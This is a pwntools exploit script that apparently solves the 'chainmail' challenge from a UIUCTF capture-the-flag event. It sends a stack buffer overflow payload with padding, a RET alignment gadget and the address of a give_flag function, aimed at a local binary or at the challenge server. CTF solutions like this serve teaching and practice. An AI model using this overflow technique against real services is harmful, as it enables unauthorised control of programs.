#!/bin/python3
from pwn import *

if not args.REMOTE:
    target = process("./chal")

else:
    target = remote("chainmail.chal.uiuc.tf", 1337)


payload = b"A" * 64 # overwrite buffer
payload += b"B" * 8 # overwrite saved rbp
payload += p64(0x40101a) # align stack (this is a RET instruction address)
payload += p64(0x401216) # overwrite saved rip to give_flag

target.sendline(payload)
target.interactive()